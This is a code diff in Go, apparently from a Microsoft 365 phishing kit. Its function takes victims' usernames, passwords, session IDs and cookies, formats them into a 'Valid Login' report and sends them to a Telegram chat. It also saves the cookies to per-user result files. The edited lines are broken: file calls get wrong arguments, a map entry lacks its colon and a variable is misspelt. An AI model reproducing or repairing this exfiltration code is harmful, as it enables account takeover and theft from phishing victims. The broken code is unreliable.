@@ -79,13 +79,13 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	// Send the message
 	var err error
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
+	msg := fmt.Sprintf("[ 🍁 0365 Cookies Result 🍁 ]\n******** [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n*****************************", username, password, KeyUser, sessionId)
+	//file, err := os.Open("/root/lukeharbor/result.txt")
+	content, err = ioutil.ReadFile("%s_Result.json", username)
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
-		" 🌟 Username ":      username,
-		" 🔑 Password ":   password,
-		" 🍪 Cookie_results":     cookies,
-		" 🏷️ Key_user":   KeyUser,
-		" 💻 Session_id ": sessionId,
+		"text":       msg,
+		"file"     content,
 	})
 
 	responseBody := bytes.NewBuffer(postBody)
@@ -99,12 +99,12 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 		log.Fatalf("%s", err)
 	}
 	
-	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
+	err = os.WriteFile("%s_Result.json", username, []byte(cookies), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
 
-	log.Println("Send Email/Telegram Cookies")
+	log.Println("Send Email/Telegram Cookies : (%s) [%s] {%s}", username, pasword, sessionId)
 	
 	// Return
 	return
